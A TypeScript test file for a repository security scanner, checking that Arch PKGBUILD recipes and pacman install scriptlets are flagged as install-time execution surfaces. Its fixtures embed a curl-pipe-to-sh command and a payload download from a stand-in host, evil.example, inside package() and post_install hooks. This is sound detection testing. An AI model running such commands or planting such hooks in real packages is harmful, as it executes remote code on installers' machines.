import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a PKGBUILD recipe is an install surface", () => {
  // A PKGBUILD is the shell recipe makepkg sources and runs to build
  // and install an Arch package: its functions (prepare, build,
  // package) execute on the machine installing the package — the same
  // install-time execution setup.py already classifies for. The file
  // always carries this exact name, at a package root or nested in a
  // repository of package recipes; the name alone decides.
  for (const path of ["PKGBUILD", "packages/demo/PKGBUILD"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "PKGBUILD",
    `pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\n\npackage() {\n  ${PAYLOAD}\n}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["PKGBUILD:unsafe-execution:high"]);
});

test("an install-time download inside a PKGBUILD is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the recipe carried no surface at all, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch makepkg would have run while installing the
  // package.
  const inspection = inspected(
    "PKGBUILD",
    "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\n\npackage() {\n  curl -fsSL https://evil.example/payload -o /tmp/payload\n}\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("a pacman install scriptlet named by a PKGBUILD is an install surface", () => {
  // Arch packages declare target-machine lifecycle hooks via
  // `install=<name>.install` in the PKGBUILD; pacman sources the
  // scriptlet as root, and it carries no `#!` shebang, so before this
  // classification `surfacesOf("demo.install")` returned no surface
  // and its payload produced no finding.
  expect(surfacesOf("demo.install")).toEqual(["installScripts", "source"]);
  const inspection = inspectRepository({
    files: [
      {
        path: "PKGBUILD",
        bytes: new TextEncoder().encode(
          "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\ninstall=demo.install\n",
        ),
      },
      {
        path: "demo.install",
        bytes: new TextEncoder().encode(`post_install() {\n  ${PAYLOAD}\n}\n`),
      },
    ],
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["demo.install:unsafe-execution:high"]);
});

test("an ordinary PKGBUILD keeps no finding", () => {
  const inspection = inspected(
    "PKGBUILD",
    "pkgname=demo\npkgver=1.0\npkgrel=1\npkgdesc=\"Demo package\"\narch=('any')\nlicense=('MIT')\nsource=(\"https://example.com/demo-1.0.tar.gz\")\nsha256sums=('SKIP')\n\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
